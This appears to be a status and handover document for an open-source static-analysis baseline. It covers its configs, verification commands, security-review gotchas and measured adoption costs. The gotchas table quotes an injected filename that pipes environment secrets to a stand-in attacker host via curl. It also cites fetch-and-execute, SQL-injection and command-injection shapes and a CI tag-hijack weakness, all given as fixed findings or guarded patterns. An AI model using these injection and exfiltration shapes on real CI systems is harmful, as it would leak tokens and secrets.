# STATUS — where maxi-quality stands

Handover doc. Read [`CONCEPT.md`](CONCEPT.md) for *what this is*; read this for
*what actually exists, what is proven, and what to do next.*

**Last updated:** 2026-08-03 · **Branches:** `develop` (default, where work
lands) → `main` (release) · **Tags:** `v1` (moving, follows `main`) · `v1.0.x`
(immutable — the newest is on
[Releases](https://github.com/maximalcode/maxi-quality/releases))

> **On the tag line.** `v1.0.1` through `v1.0.3` were cut before publication and
> do not exist here. Publishing was done as a fresh repo rather than a
> visibility flip (CLAUDE.md §2) — twice, because the first attempt carried an
> un-anonymised tree — so the history those tags pointed into was not carried
> over, and nothing external consumed any of them. The line resumes at
> `v1.0.4`, with `v1` as the moving pointer.

> **A note on the pseudonyms.** Every measurement below was taken against a real
> codebase, and every number is the real number. The codebases are private and
> stay that way, so they appear here as:
>
> | | |
> |---|---|
> | **Consumer A** | a C# + TypeScript monorepo — the main .NET consumer |
> | **Consumer B** | a TypeScript application — the outlier in §5 |
> | **Consumer C** | a Python service — the source of the Ruff ruleset |
>
> This matters for reading §5: the value of that section is the *method* —
> measure before deciding, publish the numbers that went against you — and that
> survives anonymisation intact. What does not survive is a public audit of
> somebody's private repository, which is not this project's to publish.

> **A note on `#NN` references.** Bare issue numbers in prose point at the
> **pre-publication tracker**, which lives in a private archive and was not
> published (CLAUDE.md §2). They are kept as provenance for *why* a decision was
> made. **They are not this repo's issue numbers** — the public tracker starts
> fresh at #1, so a `#5` written here and issue #5 in this repo are unrelated and
> the collision is meaningless. None of them is a consuming project's number
> either. References written with a prefix, like `typescript-eslint#10940`, are
> upstream and do resolve.
>
> Anything still to be *done* lives in the issue tracker, not in these documents.

---

## 1. TL;DR

A two-layer static-analysis baseline that other repos consume rather than
copy-paste. Layer 2 (Semgrep conventions, Gitleaks, OSV-Scanner) is identical
everywhere and grandfathers an existing backlog on day one. Layer 1 (ESLint,
Roslyn, Ruff + mypy) is per-language, on as errors, and has no per-finding
grandfathering in any of the three — so adopting it is a cleanup sprint rather
than a config change.

TypeScript, C#/.NET and Python are shipped and verified. `samples/` is the test
suite: every config is proven by an intentionally-bad fixture whose exact
findings are asserted against a committed manifest, and by a clean fixture that
must pass.

> **Planned work is not tracked in this file.** Open questions, known gaps and
> anything anyone intends to build live in the issue tracker, where they can be
> closed. A roadmap in a document is a task list nobody closes.

---

## 2. What exists

```
configs/editorconfig                    shared .editorconfig (all languages)
configs/typescript/eslint.config.mjs    strict-type-checked + stylistic + SonarJS recommended, exported flat config
configs/typescript/tsconfig.strict.json extends-able strict compiler options
configs/typescript/prettier.config.mjs  the formatter — printWidth 100 + single quotes are the two
                                        non-defaults; the rest are Prettier defaults stated on purpose
configs/typescript/expected-rules.json  the ENABLED ESLint rule set, 1342 bindings across 4 probes
configs/typescript/tsconfig.snapshot.json the options it RESOLVES to — the gate on a silently deleted flag
configs/dotnet/Directory.Build.props    AnalysisLevel, TreatWarningsAsErrors, Sonar + Roslynator
configs/dotnet/msbuild.snapshot.json    the properties it RESOLVES to, in both the default and CI+lock-file shapes
configs/dotnet/dotnet.editorconfig      C# severities + minimal style
configs/python/ruff.toml                13 rule families, line-length 100, extend-able
configs/python/mypy.ini                 mypy strict + warn_unreachable (COPY — mypy has no extend)
configs/python/settings.snapshot.json   what ruff and mypy RESOLVE to — 344 rules, and `strict` expanded

semgrep/general/       todo-without-issue, catch-and-swallow, debug-print, sync-over-async
semgrep/security/      sql-string-concat, command-injection, weak-crypto, hardcoded-secret
semgrep/conventions/   no-ambient-clock, mutation-requires-authz,
                       no-permission-denied-for-invisible-resource, no-float-for-money

scripts/adopt.sh          adopt into a consumer: detect languages, drop the copies
scripts/scan.sh           Layer 2 runner: semgrep + gitleaks + osv (+ SBOM, licences)
scripts/policy.py         resolves a consumer's .maxi-quality.yml, emits semgrep
                          args, and classifies findings into gating vs warn-only
.maxi-quality.yml         this repo's own policy — keeps samples/policy out of
                          its rule manifest (it is a consumer of itself)
scripts/check-pins.sh     bump policy (#13): pin consistency + upstream drift
scripts/quality-report.py renders the standing-report issue body (no network)
scripts/coverage.py       coverage ratchet: lcov + Cobertura vs a committed floor
scripts/check-expected.py diffs a tool's JSON output against a committed manifest
scripts/snapshot-eslint-rules.mjs  serialises the ENABLED rule set, so deleting a
                          rule no fixture triggers still fails CI
scripts/snapshot-tsconfig.mjs      the same idea for tsc --showConfig
scripts/snapshot-msbuild-props.sh  ...for dotnet msbuild -getProperty
scripts/snapshot-python-settings.py ...for ruff --show-settings and mypy's own resolver
.gitleaks.toml            allowlists the deliberately-planted sample secrets

docs/ADOPTION.md       how a project takes this on, per language
docs/REFERENCE.md      every input, flag, exit code and rule id
examples/              five copyable consumer repos — ts-npm, dotnet, python-uv,
                       mixed-monorepo, legacy-ratchet. NOT fixtures: CI asserts
                       each scans clean, is detected as the language it claims,
                       and that any policy file in it actually resolves

actions/layer2/        the Layer 2 gate — how the rules reach a consumer
actions/report-issue/  upserts the standing report issue; outputs its number
actions/coverage/      the coverage ratchet

samples/typescript/       Layer 1 TS sample — `npm run lint` must fail (14 findings)
samples/typescript-clean/ negative control — must PASS with zero findings
samples/typescript-strict/ compiler sample — `tsc` must fail with 12 diagnostics (#7)
samples/dotnet/           Layer 1 C# sample — `dotnet build` must fail
samples/dotnet-tests/     Layer 1 C# *Tests* sample — proves the #25 relaxation
samples/dotnet-clean/     negative control — must BUILD 0 errors / 0 warnings
samples/python/           Layer 1 Python sample — ruff 14 errors, mypy 11 errors
samples/python-clean/     negative control — must PASS ruff AND mypy, zero findings
samples/format/           the formatter's suite (#42) — two misformatted files and
                          three ABLATIONS, each correct under our settings and wrong
                          under the tool's own defaults, so deleting a format config
                          turns a check red instead of leaving it quietly true
samples/semgrep/          Layer 2 sample — outside both projects on purpose
samples/guards/           the fetch-and-execute shapes ci.yml's supply-chain guard
                          must catch, and the verified downloads it must not (#3)
samples/coverage/         coverage fixtures, hand-checked: 65.00 / 75.00 / 40.00 /
                          66.67 %, and 71.67 % when the first two are summed
samples/sbom/             CycloneDX fixture — all three licence spellings
samples/policy/           the policy file's own suite: one fixture per knob
                          (disable, warn, exclude, extends, groups), each
                          asserted with its policy AND with it ablated away, plus
                          eight invalid policies that must every one be fatal
samples/policy/expected/  the resolved-policy snapshot — what a policy RESOLVES
                          to, with a placeholder baseline path so it encodes
                          nobody's home directory
samples/expected/         the manifests: rule id + file + line per tool, so a
                          regression names the rule that stopped firing
```

**Rule budget: 12 conventions, 28 rule ids — the cap is fully spent.** A 13th
convention requires removing one or an explicit decision to raise the cap. The
id count is higher than the convention count because Semgrep patterns are
language-specific; splitting a convention per language is not new scope.

---

## 3. How to re-verify everything (~2 min)

```bash
npm install
npm run verify:ts                        # expect exit 1, 14 errors
npm run verify:ts:clean                  # expect exit 0, ZERO findings
npm run verify:ts:types                  # expect exit 2, 12 tsc diagnostics
npm run verify:ts:types:clean            # expect exit 0, ZERO diagnostics
npm run verify:format                    # expect exit 0, everything formatted
node scripts/snapshot-eslint-rules.mjs --check
node scripts/snapshot-tsconfig.mjs --check
./scripts/snapshot-msbuild-props.sh --check
python3 scripts/snapshot-python-settings.py --check
cd samples/dotnet && dotnet build        # expect exit 1, 23 errors, 0 warnings
cd ../dotnet-tests && dotnet build       # expect exit 1, 3 errors, 0 warnings
cd ../dotnet-clean && dotnet build       # expect exit 0, 0 errors, 0 warnings
cd ../..
pip install -r samples/python/requirements-dev.txt
ruff check samples/python                # expect exit 1, 14 errors
mypy --config-file configs/python/mypy.ini samples/python/src
                                         # expect exit 1, 11 errors
ruff check samples/python-clean          # expect exit 0, ZERO findings
mypy --config-file configs/python/mypy.ini samples/python-clean/src
                                         # expect exit 0, ZERO findings
ruff format --check --config configs/python/ruff.toml samples/python samples/python-clean
                                         # expect exit 0, 4 files already formatted
dotnet format whitespace samples/dotnet-clean --verify-no-changes
                                         # expect exit 0 — WHITESPACE, not bare
                                         # `dotnet format`, which re-runs 622 analyzers
./scripts/scan.sh                        # expect exit 1, 100 semgrep findings / 28 rule ids

# the policy file, both directions (samples/policy/)
./scripts/scan.sh samples/policy/warn --skip gitleaks --skip osv
                                         # expect exit 0 — warn-only, not gating
./scripts/scan.sh samples/policy/disable --skip gitleaks --skip osv
                                         # expect exit 1, gate=1: the disabled
                                         # rule silent, the control still firing
python3 scripts/policy.py resolve --target samples/policy/invalid/unknown-key \
        --baseline . --baseline-path .   # expect exit 3, naming the bad key

python3 scripts/coverage.py --report samples/coverage/lcov.info \
        --floor-file /tmp/f.json         # expect coverage=65.00
python3 scripts/coverage.py --report samples/coverage/cobertura.xml \
        --floor-file /tmp/f.json         # expect coverage=75.00
python3 scripts/quality-report.py --json /tmp/semgrep.json --date 2026-01-01 \
        --sbom samples/sbom/cyclonedx.json   # expect MIT 2 / Apache-2.0 1 /
                                             # "MIT OR Apache-2.0" 1 / UNKNOWN 2
```

The five **bad** samples must fail; the three **`-clean`** samples must pass.
`samples/` is the test suite: if a bad sample stops failing, the config
regressed — fix the config, never weaken the sample. If a clean sample starts
failing, the config has become over-strict — again fix the config, and never
silence it with a disable comment or a `NoWarn` inside the fixture.

`samples/dotnet-tests` is the one sample with a two-sided assertion (#25): the
three waived test idioms must stay **silent** while the dead-fixture rules must
still **fire**. Its 3 errors are the second half. Checking only that it fails
would pass just as happily if the waiver had swallowed everything — verified by
control run: 6 errors with the waiver removed, 3 with it.

Verified in both directions, and since 2026-07-31 that verification is a
committed fixture rather than a claim: `samples/typescript-clean`,
`samples/dotnet-clean` and `samples/python-clean` are the correct counterparts
of every planted bug, and CI asserts they pass with zero findings. A config that
flags everything is as useless as one that flags nothing.

`samples/python` carries a second assertion beyond its count: CI checks that all
13 selected Ruff families are actually represented in the findings. The count
alone would still read 14 with half the ruleset switched off and something else
firing twice.

This was the **last assertion in the repo with no test behind it** — the docs
had claimed it from the start.

**Tooling:** verified on Node 24 / npm 11 / .NET SDK 10. Semgrep ran via `uvx`,
Gitleaks v8.30.1 and OSV-Scanner v2 via Docker — nothing was installed globally.
`scan.sh` falls back native → `uvx`/`docker` → loud skip. For native installs:
`brew install semgrep gitleaks osv-scanner`.

---

## 4. Decisions and gotchas worth not rediscovering

| Thing | Why it is the way it is |
|---|---|
| **npm workspace at repo root** | Not cosmetic. A relative import of the base ESLint config resolves its bare imports (`@eslint/js`) from `configs/typescript/`, which has no `node_modules` → `ERR_MODULE_NOT_FOUND`. External consumers are unaffected (the package sits in their tree). |
| **TypeScript pinned `~6.0.3`** | `typescript-eslint` 8.x peer range is `>=4.8.4 <6.1.0`. TS 7 exists but is outside it. **This is not academic:** Consumer A's TypeScript workspace already runs TS 7.0.2, and typescript-eslint hard-exits — `Error: typescript-eslint does not support TS 7.0`. It blocks Layer 1 TS adoption there completely. Upstream: `typescript-eslint#10940`. |
| **`GenerateDocumentationFile=true`** | Required or `IDE0005` as an error emits a meta-diagnostic in every consuming build. `CS1591` is suppressed in the props too, so the file is self-consistent if copied without the editorconfig. |
| **`CA2000` never fires** | Not enabled at `latest-recommended`. Sonar's `S2930` catches the undisposed `IDisposable` instead — an argument for keeping Sonar rather than trusting built-ins. |
| **`samples/semgrep/` is outside both projects** | So Semgrep bait can never shift the Layer 1 samples' expected finding counts. Those files are never compiled or linted. |
| **`.gitleaks.toml` exists** | The samples contain fake credentials as bait; Gitleaks flags them on sight and would fail this repo's own gate forever. |
| **Gitleaks auto-loads `.gitleaks.toml`** | So a "control" run without `--config` is *not* a control. The honest control (default rules, explicit `--config`) gives `leaks found: 2` vs `no leaks found`. |
| **`scan.sh` targets bash 3.2** | macOS ships 3.2.57, where `"${arr[@]}"` on an empty array is fatal under `set -u`. Uses `${arr[@]+"${arr[@]}"}`. |
| **Cross-language Semgrep rules** | A rule listing two languages needs every pattern to parse in *both*. 5 patterns were rejected for this. Where syntax differs, split into `-ts` / `-dotnet` ids with an identical message. |
| **A rule's message can lie about its own escape hatch** | `catch-and-swallow` told you to explain the silence in a comment; comments are not AST nodes, so a comment-only block was still `{ }` and still matched. Following the instruction verbatim did not clear the finding. Fixed 2026-07-31 with a `pattern-not-regex` that re-reads the source text. **On real code this rule was 4/4 false positives in TypeScript** (Consumer A). If a rule documents an escape hatch, test the escape hatch — the pattern proves the rule fires, never that it can be satisfied. **It then recurred on 2026-08-02**: the regex walks from the exception parens straight to the brace, so a C# exception filter (`catch (T e) when (…)`) stepped over it and a documented-and-intentional filtered catch could not be cleared either. The deeper lesson is the shape, not the syntax — a lexical negation bolted onto an AST rule can silently miss every catch-clause form nobody thought to plant, and each miss costs a consumer a false positive first. |
| **A config block can ship switched OFF, not merely unbaited** | Found 2026-08-03 building the #8 fixtures. The three `dotnet_naming_rule` blocks were described as "inert — no sample violates them". The real cause was one level down: `dotnet_naming_rule.<rule>.severity` drives the IDE experience, while the BUILD reads the diagnostic's own severity — and `dotnet_diagnostic.IDE1006.severity` was never set. A probe with an un-prefixed interface, a snake_case class and a PascalCase private field built **clean**. Two of the three were masked by analyzers that happen to overlap (CA1715, CA1707/S101), so the gap only surfaced on the third, where a private field named `Count` was caught by nothing at all. One line fixed all three. **The lesson is the diagnosis, not the line: "no sample violates it" and "it does not work" look identical from outside, and only a planted violation tells them apart.** |
| **`IDE0035` is not emitted at build** | Measured on .NET SDK 10, same session: real unreachable code produces `CS0162` and no `IDE0035` at all, so that severity escalation is redundant rather than load-bearing. Kept — one SDK on one runner is thin evidence for deleting a consumer-visible severity — but explicitly NOT covered, and `samples/dotnet/Escalations.cs` says so where someone would otherwise assume it is. |
| **A linter and a compiler in the same baseline can contradict each other** | Found 2026-08-03 in the real-code noise run for #11. `sonarjs/no-redundant-optional` fires on `retries?: number \| undefined` and asks for the union to be deleted. `configs/typescript/tsconfig.strict.json` sets `exactOptionalPropertyTypes`, under which the two spellings mean different things — so following the linter makes `tsc` reject the code with TS2375. Verified both ways round. **It was also the highest-volume rule in the run at 144 of 520 findings, which is the part worth remembering: the thing a new plugin says most often is the thing most worth reading.** The rule is off and `samples/typescript-clean` carries the shape, so re-enabling it makes the clean fixture dirty rather than shipping. |
| **A `-clean` fixture cannot estimate noise** | Same run. `samples/typescript-clean` is 89 lines of deliberately simple code — enough to disqualify an over-strict config, not enough to say what 217 new rules do to a codebase somebody already wrote. Measured against 44,089 lines of real TypeScript, SonarJS `recommended` produced **11.8 findings per KLOC**; two rules were 52% of it and neither found a bug. A plugin adopted on catch-rate alone would have shipped that. The `-clean` fixtures answer "is it over-strict?", never "is it worth it?" — those need different corpora, and `docs/EVAL-vs-oss-tools.md` §2i is the second one. |
| **A compiler-flag fixture can fail on the wrong flag** | Found 2026-08-03 building `samples/typescript-strict` for #7. `function classify(n: number): string { if (n > 0) return 'positive'; }` looks like the obvious bait for `noImplicitReturns`, and it does fail — with TS2366 from `strictNullChecks`. Delete `noImplicitReturns` and CI stays red, so the flag reads as covered and is not. Widening the return type to `string \| undefined` satisfies `strictNullChecks` and leaves TS7030 holding the error alone. **The general shape: a fixture proves *an* error, never *which setting caused it*.** Every flag→error mapping in that directory is now verified by ablation — switch the one flag off, confirm that specific error is the one that disappears — and the manifest pins the TS code rather than just the count. |
| **`--isolatedModules false` changes nothing** | Measured on tsc 6.0.3 in `samples/typescript-strict`: `verbatimModuleSyntax` subsumes it, and TS1205's own message names `verbatimModuleSyntax`. Three more flags are unbaitable for their own measured reasons — `esModuleInterop: false` is refused outright (TS5107, deprecated ahead of TS 7), `forceConsistentCasingInFileNames` needs a case-insensitive filesystem, and the emit trio is invisible under `--noEmit`. Hence `configs/typescript/tsconfig.snapshot.json`: what `tsc --showConfig` **resolves**, not what the JSON file says, so it also pins the options tsc implies (`moduleDetection: force`, `preserveConstEnums`). |
| **`pattern-not-regex` must be nested under `patterns:`** | Placed at rule level next to a top-level `pattern-either`, Semgrep **silently ignores it** — no error, no warning, the rule just behaves as if it were absent. Verified the hard way: identical output before and after adding it. It only takes effect inside a `patterns:` block alongside the `pattern-either`. |
| **Analyzer versions pinned, not floating** | With `TreatWarningsAsErrors`, an analyzer upgrade that adds rules is a breaking change. Bump deliberately — the policy and its mechanism are §6 (#13). |
| **Semgrep is pinned twice** | `actions/layer2/action.yml` (what consumers get) and `ci.yml`'s `layer2-counts` (what validates the 60/19 assertion). They must match or CI is testing a tool nobody runs. `scripts/check-pins.sh --offline` guards it on every PR. |
| **osv-scanner emits empty licences unless you ask** | `--format=cyclonedx-1-6` alone gives every component `"licenses": []` — the key is present and the array empty. Bare `--licenses` (no `=allowlist`) is the report-only mode that actually resolves them, and it exits 0. Without it the standing report renders a tidy table of *N* UNKNOWNs and looks completely fine. Measured: 104 components, 0 with licences vs 102 with. |
| **osv-scanner needs `--all-packages` for an SBOM** | Otherwise the CycloneDX output holds only the packages in the *results* — 28 instead of 94 on this repo. An inventory that shrinks as things improve is not an inventory. |
| **osv-scanner will not create its output directory** | It exits **127** with `failed to create output file`, which reads as "the tool is broken" rather than "make the folder". `scan.sh` `mkdir -p`s the parent. |
| **The licence gate has no default allowlist** | Measured on this repo's own tree, a plausible one flags `SonarAnalyzer.CSharp` and `typing-extensions` as *non-standard* and `pathspec` as MPL-2.0. First-party workspace packages resolve to `UNKNOWN` and trip any allowlist too. A default would be wrong for someone on day one; the inventory is on by default instead. |
| **Coverage: root attributes beat counting `<line>`** | coverlet emits one `<class>` per **type**, so a file holding two types lists its lines twice and an element count inflates. `samples/coverage/cobertura.xml` encodes exactly that shape — if it ever reports 66.67 instead of 75.00, the parser started counting elements. |
| **A zero-line coverage report is not 100%** | It is a broken test run. Recording it as a floor would raise the floor to 100 and brick the consumer's gate permanently. Same class: an unparseable floor file must never be read as "no floor yet", which silently restarts the ratchet at whatever today happens to be. |
| **actionlint does not read `actions/*/action.yml`** | It lints workflows only — so the composite actions, the part every consumer actually executes, had **no** shell linting at all. That is the same gap the report action shipped broken through. `ci.yml` now extracts each bash `run:` body and shellchecks it. |
| **`${{ }}` inside a `run:` body is textual substitution** | It happens before bash parses the script, so an input carrying a quote stops being a value and becomes code. Every composite action now passes inputs via `env:`, and CI fails if a new one does not. |
| **`pattern-regex` matches RAW TEXT, so quotes are not interchangeable** | Unlike a semgrep string pattern, `pattern-regex` does not treat `'x'` and `"x"` alike. `sql-string-concat-ts` shipped with only the double-quoted branch, so `db.query('SELECT … ' + id)` — single quotes being the prevailing TS style, and the commonest SQL-injection shape in JavaScript — was silently exempt. The root cause was not the regex: **the concatenation branch had no fixture at all**, so 28/19 was green over the gap. Found in security review pass 3. |
| **…and fixing one instance does not fix the pattern** | `command-injection-ts` carried the identical defect, in the same shape, for as long again: backtick and double-quoted branches, no single-quoted one, so `exec('ls -la ' + dir)` matched nothing. Same root cause too — neither concatenation branch had a fixture. The lesson is not "check quote styles", it is that a defect found by measurement is a *class*, and the sibling rule is the first place to look. Both now bait every branch. |
| **A fixed list of entry-point method names ages badly** | `sql-string-concat-ts` matched `.query` / `.execute` / `.raw` as literal patterns, so Prisma's `$queryRawUnsafe` and `$executeRawUnsafe` — the two methods whose names say outright that they do not parameterise — matched nothing, under a ✅ in the README. A bound metavariable plus a `metavariable-regex` puts the accepted names in one readable place. The list stays deliberately short: `$queryRaw` is a tagged template that Prisma parameterises, so flagging it would be a false positive on the safe form of the same API. |
| **An exemption needs its own fixture, and the way to prove it is to delete the exemption** | `mutation-requires-authz-*` listed seven escape hatches across the two languages; two had bait. A fixture that passes proves nothing on its own — it looks identical whether the exemption matched or the rule never reached the method. The check that means something is to remove one `pattern-not` at a time and confirm exactly one fixture starts firing. Doing that found all four C# branches load-bearing and one TypeScript branch **dead**: `await $AUTHZ.require(...)` is subsumed by the plain form, because semgrep matches the call inside the await. It was deleted — a branch no fixture can single out cannot be shown to work and cannot be shown to have stopped. |
| **A rule can promise more than it delivers** | `weak-crypto`'s message and the README both said "MD5/SHA1/DES/RC4". The rule listed exact literals, so `createHash('MD5')` (OpenSSL names are case-insensitive) and `createCipheriv('des-ede3-cbc', …)` (the real Triple-DES identifier) both passed. Documented coverage exceeding real coverage is worse than no rule — it is the reason someone stops looking. |
| **Do not "clean up" a rule into a regex** | Rewriting `weak-crypto` as a single `metavariable-regex` looked tidier and silently LOST a detection: semgrep constant-propagates literal string patterns, so `const a = 'md5'; createHash(a)` matched the old rule. A `metavariable-regex` sees the variable's NAME. Both branches are kept deliberately. Caught while testing the fix, not after shipping it. |
| **`[[ ]] && cmd` under `set -e` — the precise rule** | This repo documented it as "exits the whole job", three times. Measured: a false `[[ ]] && cmd` does **NOT** abort mid-script. It bites in exactly two places — as the LAST statement of a script (the script exits 1, so a CI step goes red) and as the last statement of a FUNCTION (the function returns 1, which callers read as failure). The `if`-block form is still right, but for the narrower reason. Comments corrected in `quality.yml` and `actions/coverage`. |
| **Three copies of one ladder is one bug waiting** | `scan.sh` resolved each tool (native → uvx → docker → skip) in its own copy. The copies diverged: the docker branches set semgrep's working directory with `-w /repo`, the native branch did not `cd` at all, so `--baseline-commit` resolved against the wrong repo and `--changed-only` reported zero findings forever while printing that it had limited the scan. Nothing compared the paths because nothing held them side by side. Now one `resolve_tool`, and `ci.yml`'s `tool-resolution` job asserts the resolved docker commands with a fake `docker` on PATH — the branch a runner would otherwise never execute. |
| **A consumer's FILENAMES reach the matrix, and a matrix value in a `run:` body is code** | `detect` globs the consuming repo's tree; `dotnet build "${{ matrix.target }}"` spliced that filename into the script text before bash parsed it. A file named `a";env|curl attacker.example -d@-;".csproj` — added by anyone who can open a PR against a CONSUMER — ran as shell in that consumer's CI with their token. Note the absence of slashes: a filename cannot contain `/`, which rules out `curl https://host/path\|sh` and is not a mitigation. Found in security review pass 2, after pass 1 added the interpolation guard and scoped it to `actions/` only — the worst instance was one directory up, in the consumer-facing workflow. |
| **The interpolation guard cannot exempt comments** | The fetch-and-execute guard skips comment lines so this repo can document what it bans. The interpolation guard must NOT: substitution happens before bash sees the text, so a value containing a newline escapes a shell comment into executable code. The literal expression syntax is therefore simply never written inside a `run:` body here — actionlint also tries to parse it. |
| **`workflow_run` + `branches:` is not an origin check** | `branches:` filters the triggering run's HEAD BRANCH NAME, and for a fork PR that name is the branch inside the FORK — so anyone who forks and commits on their own `main` matches `branches: [main]`. The job then runs in THIS repo with THIS repo's permissions. `release-tag.yml` had `contents: write` and gated only on `conclusion == 'success'`, which made the `v1` tag hijackable by any fork PR that passed CI — and CI passes for any change that leaves `samples/` alone. Found in the pre-publication security review, 2026-08-01, before the repo went public and made it reachable by anyone. The real gate is `workflow_run.event == 'push'`. |
| **The SHA-pin guard did not cover pipes** | It matches `uses:` lines. `curl … \| sh` is not a `uses:` line, so `quality.yml` shipped an unpinned installer — fetched over a moving URL, piped into a shell, running in EVERY consumer's CI with THEIR token — while `workflow-lint` reported "every third-party action is pinned". The lesson is not "add the missing regex", it is that a guard which passes while its own violation sits in the same file gets cited as evidence. There is now a second check for fetch-and-execute, and it skips comment lines so this file can document the pattern it bans. |
| **`--exclude-rule` needs the FULL prefixed id, and the prefix encodes the config path** | Measured 2026-08-03 on semgrep 1.172.0, building the policy file. `--exclude-rule weak-crypto` excludes **nothing** and exits 0 without a word; `--exclude-rule semgrep.security.weak-crypto` works. The prefix is derived from `--config` exactly as written, so the same rule is `semgrep.security.weak-crypto` from the repo root, `baseline.semgrep.security.weak-crypto` under docker, and `Users.<you>.dev.maxi-quality.semgrep.security.weak-crypto` from an absolute path. `scan.sh` passes a different config path on its native and docker branches, so an exclusion computed for one is silently inert on the other — the same divergence that made `--changed-only` a no-op gate. `policy.py` computes the prefix **and** `classify` then asserts no disabled rule survived into the results, so a mangling change fails loudly instead of quietly un-disabling somebody's policy. |
| **`--exclude` matches path components, not globs** | Same session. `--exclude 'legacy/**'` — the spelling every other tool accepts, and the first thing anyone writes — matches nothing and reports nothing. `legacy`, `legacy/` and `samples/policy` all work; `./legacy` and `*/legacy/*` do not. `policy.py` rejects any pattern containing `**` and names the working form, and `classify` separately fails if a finding is reported under a path the policy said to exclude. |
| **A `.semgrepignore` REPLACES semgrep's defaults** | Measured while looking for somewhere to put the policy fixtures. A `.semgrepignore` listing one directory caused `node_modules/` to start being scanned — the built-in ignore list is not merged with yours, it is superseded. This repo has a `node_modules/` full of TypeScript, so that would have been a very loud accident. The fixtures are excluded through this repo's own `.maxi-quality.yml` instead, which is one mechanism rather than two and dogfoods the feature. |
| **An exclusion fixture can be inert because the tool already ignores that path** | The `paths.exclude` fixture first excluded a directory called `vendor/`. It passed. It also passed with the policy deleted — semgrep skips `vendor/` by default, so the fixture proved nothing at all, exactly like the `noImplicitReturns` fixture that really failed on `strictNullChecks`. Renamed to `legacy/`, and every policy fixture is now asserted **twice**: once with its policy and once with the policy moved out of the way. The ablation is the assertion; the passing run on its own never was one. |
| **Two tags, on purpose** | `v1` is a *moving* pointer to the newest `v1.x` (the `actions/checkout@v4` convention) — that is how consumers pick up fixes without editing a workflow file, so moving it forward requires a force-push and that is expected, not an accident. It follows `main` automatically via `release-tag.yml`, which is why a merge to `main` is a release and contributions go to `develop` instead. The `v1.0.x` tags are immutable, for pinning something that can never shift; they are cut by hand, one per release worth naming, and each gets a GitHub Release carrying the notes. **Never attach a Release to `v1`** — it is force-pushed, so the notes would come to describe a different commit than the one they were written for. |

---

## 5. What adoption cost, measured

Measured against three real private codebases (see the pseudonym note above).
Only two appear in the table below: adopting the Python half cost Consumer C a
single line of `per-file-ignores`, because that project was already clean under
an equivalent ruleset — which is why the baseline ships its thirteen families
rather than a smaller invented set.

Comments elsewhere in this repo refer to these runs by phase: **Phase A**
measured Layer 2, and **Phases B, C and D** measured Layer 1 for C#, TypeScript
and Python respectively.

The point of these numbers is the *asymmetry* between the layers, which is the
decision a reader actually has to make:

| | Findings | What it takes to go green |
|---|---|---|
| **Layer 2**, Consumer A | 57 after rule tuning (70 before) | one line — `changed-only: origin/main`, and they are deferred |
| **Layer 2**, Consumer B | 15 after rule tuning (17 before) | same |
| **Layer 1** C#, Consumer A | **197** (~120 after tuning) | fix them, on a repo *already* at 0 warnings under its own strict props |
| **Layer 1** TS, Consumer A | **445** | fix them |
| **Layer 1** TS, Consumer B | **4,902** | fix them |

Three things worth carrying forward, all of which are about *measuring*, not
about any particular codebase:

- **Layer 1's first-run number says as much about the repo as about the
  baseline.** Consumer B's 4,902 traces to a single untyped interop boundary
  spraying `any`; the bug-class share inside it was 36 findings, or 0.7%.
  Consumer A was 35 inside 445. Same config, opposite verdict. Measure before
  committing.
- **Count from JSON, never from the human-readable output.** Semgrep prints a
  rule id once per file and lists further matches under it, so header-counting
  undercounts. `ci.yml` asserts against JSON for the same reason.
- **Record the scan scope next to the count, or it is not a measurement.** Two
  runs of the same tool against the same target on the same day disagreed, and
  nothing written down could settle which was right.

The per-codebase detail behind these figures is deliberately not published —
this repo is a description of a baseline, not an audit of somebody's private
repository.

---

## 6. Dependency bumps

**Dependabot opens it, CI judges it, a human resolves it.**

The usual argument against automating bumps is that with
`TreatWarningsAsErrors` an analyzer upgrade adding one rule is a breaking
change. That argument does not hold here, because `samples/` asserts an **exact
set of findings**. A bump that changes what fires cannot merge quietly — it
turns CI red naming the rule that moved, and the bump PR becomes the place
someone reads the new rule and decides.

| What | Mechanism | Cadence |
|---|---|---|
| ESLint toolchain, TypeScript | Dependabot, grouped | monthly |
| SonarAnalyzer, Roslynator | Dependabot, grouped | monthly |
| Actions used by this repo | Dependabot, grouped | monthly |
| Semgrep, Gitleaks, OSV-Scanner | `scripts/check-pins.sh` + weekly `pins` workflow | weekly |

The split exists because Dependabot has no ecosystem for *a version string
inside an action input default*, which is exactly how the three Layer 2 tools
are pinned in `actions/layer2/action.yml`.

`typescript` majors are excluded from automation — typescript-eslint declares
`<6.1.0` and refuses TS 7 outright.

**When a bump turns CI red:** read which rule id moved, and if the new finding
is genuine, update the expected manifest *and say why*. Never weaken a sample to
make a bump green (CLAUDE.md §5). Then move the `v1` tag, or consumers keep the
old ruleset.

`check-pins.sh` also asserts something that had no guard at all: Semgrep is
pinned in **two** places — the action default and `ci.yml`'s `layer2-counts`
job. If those drift, CI asserts its findings against a Semgrep consumers never
run, and the samples stop meaning what they claim. That check is offline and
runs on every PR.

**`no-console` is a warning, not an error.** It only gates because the sample
runs `--max-warnings 0`. Consuming repos must do the same or it is toothless.

---


## 7. Hardening pass (2026-08-01)

Prompted by "I bet our quality gate isn't enterprise level". It was measured
before anything was written, and the measurement changed what got built.

**Detection is not the weak part.** The free Semgrep registry, run against this
repo's own planted samples: 22 rules loaded (2 multilang + 20 TS, **zero C#**),
~100% of lines parsed, **0 findings**, on files carrying planted SQL injection
and command injection. Our 12 hand-written conventions found 28 on those same
files at the time of that scan (100 today — the ruleset gained fixtures and
branches since, which is why this number is left as measured rather than
refreshed). Same result as `docs/EVAL-vs-sonarqube.md`. Adding scanners would
have made the gate slower and no better.

> **Read "zero C#" narrowly.** That observation is about the pack scanned here,
> `p/security-audit`. It is not true of the free registry as a whole:
> `p/owasp-top-ten` runs 27 C# rules and `p/csharp` is a 27-rule C# pack
> (`EVAL-vs-oss-tools.md` §2d, 2026-08-02). The conclusion is unchanged —
> `p/owasp-top-ten` still found 3 of 103 — but the reason as originally written
> was wider than the measurement supported.

**Enforcement is the weak part, and it is not a tooling problem.** Branch
protection on a private repo owned by a personal account needs GitHub Pro:

```
Upgrade to GitHub Pro or make this repository public to enable this feature.
```

Without it there are no *required* checks, and a gate that cannot be required
is advisory — a PR can go red and merge anyway, which is exactly what happened.
That was the one thing genuinely blocked on spend, and publishing removed it:
branch protection is free on a public repo, so `ci` can be a required check
without breaking the zero-spend criterion. GHAS/code scanning was
considered and rejected for the same reason plus billing risk.

What shipped instead, all at zero cost:

| Change | The hole it closes |
|---|---|
